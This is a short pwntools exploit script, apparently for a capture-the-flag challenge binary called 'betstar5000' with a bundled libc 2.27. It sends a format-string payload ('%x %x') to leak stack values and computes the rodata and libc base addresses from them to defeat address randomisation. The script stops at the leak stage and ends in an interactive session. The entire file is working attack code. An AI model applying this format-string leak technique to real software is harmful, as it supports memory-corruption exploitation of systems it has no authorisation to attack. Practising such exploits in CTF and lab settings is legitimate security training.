from pwn import *
import struct

binary = context.binary = ELF("./betstar5000")
libc = ELF("./libc-2.27.so")

if args.GDB:
    p = gdb.debug(binary.path, env={"LD_PRELOAD":libc.path}, gdbscript='b *__libc_start_main + 0xed')
else:
    p = process(binary.path, env={"LD_PRELOAD":libc.path})

atoi_addr = 0x00012584

p.sendline(b"1")
p.sendline(b"%x %x")
p.sendline(b"1")
p.sendline(b"1")
p.sendline(b"1")

p.readuntil("And the winner is *drumroll*: ")
rodata_addr = int(p.readuntil(" ")[:-1], 16) - 0x105c
libc_addr = int(p.readuntil("\n")[:-1], 16) - 0x1d85c0
print(rodata_addr, libc_addr)
print(hex(rodata_addr), hex(libc_addr))

p.interactive()